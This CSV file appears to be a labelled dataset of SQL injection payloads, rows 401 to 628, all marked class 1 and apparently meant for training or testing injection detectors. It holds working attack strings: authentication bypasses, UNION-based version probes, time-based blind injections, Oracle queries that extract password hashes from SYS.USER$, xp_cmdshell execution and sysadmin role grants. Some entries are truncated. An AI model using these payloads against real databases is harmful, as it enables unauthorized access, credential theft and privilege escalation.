index,payload,class
401," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i",1
402," select * from users where id  =  1 or 1#"",  =  1 or 1  =  1 -- 1",1
403,||6,1
404,or 1/*,1
405," and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,116   )    )   <>char  (  39,39   )    )   ,1,0   )    )   ;",1
406,select * from users where id  =  1.%@ or 1  =  1 -- 1,1
407," select * from users where id  =  1 or ""..""  =  1 or 1  =  1 -- 1",1
408," select * from users where id  =  1 or 1&@#  =  1 union select 1,version  (    )   -- 1",1
409," select * from users where id  =  1 or "";]"" or 1  =  1 -- 1",1
410," or 1  =  1 or """"  =  ",1
411," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",1
412,select * from users where id  =  1 or $<\. or 1  =  1 -- 1,1
413," select * from users where id  =  1 *  (  1  )   union select 1,banner from v$version where rownum  =  1 -- 1",1
414,or 'whatever' in   (  'whatever'  ) ,1
415,declare @s varchar   (  200  )   select @s   =   0x73656c65637420404076657273696f6e exec  (  @s  ) ,1
416,select * from users where id  =  '1'   or 1  =  1 -- 1',1
417,?,1
418, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  table_name   )    )    FROM sys.all_tables   )    )    AND 'i'  =  'i,1
419," select * from users where id  =  '1' union select @ 1,version  (    )   --  1'",1
420,"admin""  )   or   (  ""1""  =  ""1""#",1
421," select * from users where id  =  1 or 1#"", union select 'a',version  (    )   -- 1",1
422," select * from users where id  =  1 or ""$  (  "" or 1  =  1 -- 1",1
423, or '' ',1
424," select * from users where id  =  1 or "";#"" or 1  =  1 -- 1",1
425,or 1  =  1,1
426," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",1
427,""" or benchmark  (  10000000,MD5  (  1   )    )   #",1
428,""" or ""x""  =  ""x",1
429,select * from users where id  =  '1'<@.. or 1  =  1 -- 1',1
430," select * from users where id  =  1 or !<@ union select 1,version  (    )   -- 1",1
431, or 'something' like 'some%',1
432," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",1
433,select * from users where id  =  '1' or \<\. or 1  =  1 -- 1',1
434,admin' or '1'  =  '1'--,1
435," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",1
436," select * from users where id  =  1 <@<@ union select version  (    )  ,version  (    )   -- 1",1
437," select * from users where id  =  1 or 1#""$ union select null,version  (    )   -- 1",1
438,""";waitfor delay '0:0:__TIME__'--",1
439,select * from users where id  =  '1' *$ 1 or 1  =  1 -- 1',1
440," select * from users where id  =  1 or \<\ union select null,@@VERSION -- 1",1
441," select * from users where id  =  1 or ""?@"" or 1  =  1 -- 1",1
442,’ or ‘1’  =  ’1,1
443," select * from users where id  =  '1' union select 1a,banner from v$version where rownum  =  1 -- 1'",1
444,admin'or 1  =  1 or ''  =  ',1
445," select * from users where id  =  '1' or !<1 union select 1,version  (    )   -- 1'",1
446," and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,11 ...",1
447,exec  (  @s  ) ,1
448," select * from users where id  =  1 or ""_  )  "" or 1  =  1 -- 1",1
449," select * from users where id  =  1 or \.<   =  1 union select 1,@@VERSION -- 1",1
450, or 1  =  1,1
451,select * from users where id  =  1 + $+%1 or 1  =  1 -- 1,1
452," select * from users where id  =  1.  union select version  (    )  ,version  (    )   -- 1",1
453," select * from users where id  =  '1' + @ @1 union select 1,version  (    )   -- 1'",1
454, --,1
455," select * from users where id  =  '1'   union select null,banner from v$version where rownum  =  1 -- 1'",1
456," select * from users where id  =  11||1 union select 1,banner from v$version where rownum  =  1 -- 1",1
457," select * from users where id  =  1.*1 union select 1,banner from v$version where rownum  =  1 -- 1",1
458,update,1
459, or 1/*,1
460," select * from users where id  =  1.<1# union select 1,version  (    )   -- 1",1
461,"""   )    )    or pg_sleep  (  __TIME__  )  --",1
462,||'6,1
463," select * from users where id  =  1. <@ union select 1,version  (    )   -- 1",1
464,or   (  EXISTS  ) ,1
465,^',1
466,or 'text'   =   n'text',1
467," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",1
468," select * from users where id  =  '1' union select $ _,@@VERSION -- 1'",1
469," select * from users where id  =  1 or ""  )  ;"" or 1  =  1 -- 1",1
470," select * from users where id  =  1 <@1$ union select 1,version  (    )   -- 1",1
471, or 0  =  0 --,1
472," select * from users where id  =  1 or ""{1""  =  1 or 1  =  1 -- 1",1
473," select * from users where id  =  1 or ""{,""  =  1 or 1  =  1 -- 1",1
474," select * from users where id  =  1 or 1#"", union select version  (    )  ,version  (    )   -- 1",1
475," select * from users where id  =  1 or 1#""? union select 'a',version  (    )   -- 1",1
476,password:*/  =  1--,1
477," select * from users where id  =  1 <@. union select 1,version  (    )   -- 1",1
478," select * from users where id  =  1 or ""  )  @"" or 1  =  1 -- 1",1
479," select * from users where id  =  '1' union select @ @1,version  (    )   --  1'",1
480," union   (  select NULL,   (  select @@version   )    )    --",1
481," select * from users where id  =  1 or ""  )  {"" or 1  =  1 -- 1",1
482," select * from users where id  =  1.<@. union select 1,version  (    )   -- 1",1
483," select * from users where id  =  1 +\. union select null,@@VERSION -- 1",1
484," select * from users where id  =  1 + @<@. union select 1,version  (    )   -- 1",1
485," select * from users where id  =  1 or \<$ union select 1,@@VERSION -- 1",1
486," select * from users where id  =  1 or   (  $+  )    =  1 union select 1,@@VERSION -- 1",1
487," select * from users where id  =  1 +   (  \+  )   union select null,@@VERSION -- 1",1
488," select * from users where id  =  1. union select null,version  (    )   -- 1",1
489," select * from users where id  =  1 or ""  )  ["" or 1  =  1 -- 1",1
490," select * from users where id  =  1 or \.<1 union select 1,@@VERSION -- 1",1
491, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT banner FROM v$version WHERE ROWNUM  =  1   )    )    AND 'i'  =  'i,1
492,select * from users where id  =  1 <@$_ or 1  =  1 -- 1,1
493," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  3   )    )    AND 'i'  =  'i",1
494," select * from users where id  =  1 or $+<$ union select 1,@@VERSION -- 1",1
495," select * from users where id  =  1 or ""@%"" or 1  =  1 -- 1",1
496," select * from users where id  =  1 or $<\ union select 1,@@VERSION -- 1",1
497," select * from users where id  =  1 or ""%,"" or 1  =  1 -- 1",1
498,UNION SELECT,1
499,asc,1
500," || myappadmin.adduser  (  'admin', 'newpass'  )   || '",1
501,"exec sp_addsrvrolemember 'name' , 'sysadmin'",1
502," select * from users where id  =  1 or   (  \  )    =  1 union select 1,@@VERSION -- 1",1
503,  )   or true--,1
504," select * from users where id  =  1 +  (  1  )   union select 1,banner from v$version where rownum  =  1 -- 1",1
505," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  3   )    )    AND 'i'  =  'i",1
506, or userid like '%,1
507," union   (  select NULL, NULL,   (  select @@version   )    )    --",1
508,/,1
509,select * from users where id  =  1 or $<\ or 1  =  1 -- 1,1
510,"admin""/*",1
511," select * from users where id  =  1.  union select 1,version  (    )   -- 1",1
512," select * from users where id  =  1 union select @<@.,version  (    )   -- 1",1
513," select * from users where id  =  1 or ""._"" or 1  =  1 -- 1",1
514,"admin"" or ""1""  =  ""1",1
515, union   (  select @@version  )   --,1
516, or ''^',1
517,"""   )    )    or sleep  (  __TIME__  )    =  """,1
518," union   (  select NULL, NULL, NULL, NULL,  NULL,   (  select @@version   )    )    --",1
519," select * from users where id  =  1 or \+<\ union select 1,@@VERSION -- 1",1
520," select * from users where id  =  1 union select @ _,version  (    )   -- 1",1
521,select * from users where id  =  1 +   (  $+  )   or 1  =  1 -- 1,1
522,select * from users where id  =  '1' <@$_ or 1  =  1 -- 1',1
523," select * from users where id  =  1 +$ 1 union select null,@@VERSION -- 1",1
524," select * from users where id  =  1 or ""  (  &"" or 1  =  1 -- 1",1
525,"""hi""""  )   or   (  """"a""""  =  """"a""",1
526,select name from syscolumns where id   =     (  sele ...,1
527," select * from users where id  =  1 or ""1,"" or 1  =  1 -- 1",1
528,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 5  )   waitfor delay '0:0:2' --",1
529," select * from users where id  =  '1' + @<@# union select 1,version  (    )   -- 1'",1
530, or 2 between 1 and 3,1
531,union all select @@version--,1
532," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i",1
533,t'exec master..xp_cmdshell 'nslookup www.google.com'--,1
534,""" or isNULL  (  1/0  )   /*",1
535," select * from users where id  =  '1' + $+*$ union select 1,@@VERSION -- 1'",1
536," select * from users where id  =  1 or ""{?"" or 1  =  1 -- 1",1
537," select * from users where id  =  1 or ""{#"" or 1  =  1 -- 1",1
538,declare @q nvarchar   (  200  )   0x730065006c00650063 ...,1
539, or 'a'  =  'a,1
540, union all select @@version--,1
541," select * from users where id  =  1 or  1<@  =  1 union select 1,version  (    )   -- 1",1
542,"admin"" or 1  =  1/*",1
543, or   (  EXISTS  ) ,1
544," select * from users where id  =  1<@<@ union select 1,version  (    )   -- 1",1
545,declare @s varchar   (  8000  )   select @s   =   0x73656c ...,1
546," select * from users where id  =  '1' union select +\#,@@VERSION -- 1'",1
547," select * from users where id  =  1. union select 1,banner from v$version where rownum  =  1 -- 1",1
548," select * from users where id  =  1 or "".;"" or 1  =  1 -- 1",1
549," select * from users where id  =  1 union select 1 1a,version  (    )   -- 1",1
550," union   (  select NULL, NULL, NULL, NULL,    (  select @@version   )    )    --",1
551,hi' or 1  =  1 --,1
552, UNION SELECT,1
553,select * from users where id  =  1 %  (  $  )   or 1  =  1 -- 1,1
554," select * from users where id  =  1 or 1#""  (   union select 'a',version  (    )   -- 1",1
555," select * from users where id  =  1 or ""{  )  "" or 1  =  1 -- 1",1
556," select * from users where id  =  1 or ""1["" or 1  =  1 -- 1",1
557,desc,1
558," select * from users where id  =  1 or "",  )  ""  =  1 or 1  =  1 -- 1",1
559,anything' or 'x'  =  'x,1
560," select * from users where id  =  1 or 1#""1 union select 1,version  (    )   -- 1",1
561,select * from users where id  =  1 + \+%\ or 1  =  1 -- 1,1
562,0x770061006900740066006F0072002000640065006C00 ...,1
563," select * from users where id  =  1 -@<@ union select version  (    )  ,version  (    )   -- 1",1
564," select * from users where id  =  '1' or $<\. union select 1,@@VERSION -- 1'",1
565," select * from users where id  =  1 or ""]."" or 1  =  1 -- 1",1
566," select * from users where id  =  1 or ""_;"" or 1  =  1 -- 1",1
567,or isNULL  (  1/0  )   /*,1
568,"insert into users  (  login, password, level  )   values  (   char  (  0x70  )   + char  (  0x65  )   + char  (  0x74  )   + char  (  0x65  )   + char  (  0x72  )   + char  (  0x70  )   + char  (  0x65  )   + char  (  0x74  )   + char  (  0x65  )   + char  (  0x72  )  ,char  (  0x64  )  ",1
569," select * from users where id  =  1 or ""  )    (  ""  =  1 or 1  =  1 -- 1",1
570," select * from users where id  =  1 or ""$@"" or 1  =  1 -- 1",1
571,"admin"" or ""1""  =  ""1""#",1
572,"admin"" or 1  =  1--",1
573, or user like '%,1
574,admin'  )   or '1'  =  '1,1
575,""" or sleep  (  __TIME__  )  #",1
576," select * from users where id  =  1 or ""  )  $"" or 1  =  1 -- 1",1
577," select * from users where id  =  1 or ""?%"" or 1  =  1 -- 1",1
578,select * from users where id  =  '1' + $+%$ or 1  =  1 -- 1',1
579, or ''-',1
580," select * from users where id  =  '1' union select \.#,@@VERSION -- 1'",1
581,admin'  )   or '1'  =  '1'/*,1
582," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  3   )    )    AND 'i'  =  'i",1
583," select * from users where id  =  1 or ""@?"" or 1  =  1 -- 1",1
584,select * from users where id  =  1 <@$ or 1  =  1 -- 1,1
585,x' or 1  =  1 or 'x'  =  'y,1
586," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i",1
587," select * from users where id  =  1 union select 1 $,version  (    )   -- 1",1
588,  )   or   (  'x'  )    =    (  'x,1
589, ( ,1
590," select * from users where id  =  1 or 1#""  (   union select version  (    )  ,version  (    )   -- 1",1
591," select * from users where id  =  1.%@ union select 1,version  (    )   -- 1",1
592," select * from users where id  =  1 +$+ union select null,@@VERSION -- 1",1
593," select * from users where id  =  '1' union select \.,@@VERSION -- 1'",1
594," select * from users where id  =  1 or 1#""@ union select null,version  (    )   -- 1",1
595," select * from users where id  =  1 +$+. union select null,@@VERSION -- 1",1
596," select * from users where id  =  1 +1<@ union select null,version  (    )   -- 1",1
597, )    )    or sleep  (  __TIME__  )    =  ',1
598,having 1  =  1--,1
599,!,1
600,select * from users where id  =  1 or $ 1  =  1 or 1  =  1 -- 1,1
601, group by userid having 1  =  1--,1
602," select * from users where id  =  '1' or @ 1  =  1 union select 1,version  (    )   -- 1'",1
603," select * from users where id  =  1 or 1#""; union select 1,version  (    )   -- 1",1
604,or 0  =  0 --,1
605, or 0  =  0 #,1
606,or pg_sleep  (  __TIME__  )  --,1
607,or '1'  =  '1'--,1
608," select * from users where id  =  1 or 1#""1 union select 'a',version  (    )   -- 1",1
609," select * from users where id  =  1 or 1#"".  =  1 union select 1,version  (    )   -- 1",1
610," select * from users where id  =  1 or @#""{  =  1 union select 1,version  (    )   -- 1",1
611, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  USERNAME   )    )    FROM SYS.ALL_USERS   )    )    AND 'i'  =  'i,1
612,sqlvuln,1
613," select * from users where id  =  1 or "".{"" or 1  =  1 -- 1",1
614," select * from users where id  =  1 or 1#""; union select 'a',version  (    )   -- 1",1
615,0x730065006c0065006300740020004000400076006500 ...,1
616," select * from users where id  =  1 union select 1 1$,version  (    )   -- 1",1
617," select * from users where id  =  1. <@ union select version  (    )  ,version  (    )   -- 1",1
618,declare @s varchar   (  8000  )   select @s   =   0x73656c65637420404076657273696f6e,1
619,select * from users where id  =  '1' or \<$ or 1  =  1 -- 1',1
620, or ''&',1
621," select * from users where id  =  1 or ""?_"" or 1  =  1 -- 1",1
622," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",1
623," select * from users where id  =  '1' union select \.%1,@@VERSION -- 1'",1
624," select * from users where id  =  1 or 1#""$ union select version  (    )  ,version  (    )   -- 1",1
625,or 'something'   =   'some'+'thing',1
626,#NAME?,1
627,or 1 in   (  select @@version  )  --,1
628,declare @q nvarchar   (  4000  )   select @q   = ,1
